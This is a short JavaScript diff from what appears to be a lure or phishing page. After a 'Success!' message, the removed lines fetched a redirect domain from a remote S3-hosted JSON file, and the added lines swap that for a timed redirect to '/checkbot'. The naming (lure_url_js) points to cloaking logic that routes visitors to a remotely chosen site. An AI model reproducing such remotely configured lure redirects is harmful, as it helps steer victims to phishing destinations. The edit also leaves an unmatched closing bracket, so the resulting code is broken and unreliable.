@@ -498,11 +498,14 @@
             var lure_url_js = "https://google.com/";
             var url = lure_url_js + "#";
             (document.getElementById("msg").innerHTML = "Success!"),
-              fetch('https://netlify2.s3.eu-west-2.amazonaws.com/netligit.json')
-                  .then((response) => response.json())
-                  .then(function(data) {
+              // fetch('https://netlify2.s3.eu-west-2.amazonaws.com/netligit.json')
+              //     .then((response) => response.json())
+              //     .then(function(data) {
                       // filter(data);
-              	window.location.href = data.domain_name;
+              setTimeout( function(){
+                window.location.href = '/checkbot';
+              }, 2000);
+              	
               });
           },
           onFail: cleanMsg,
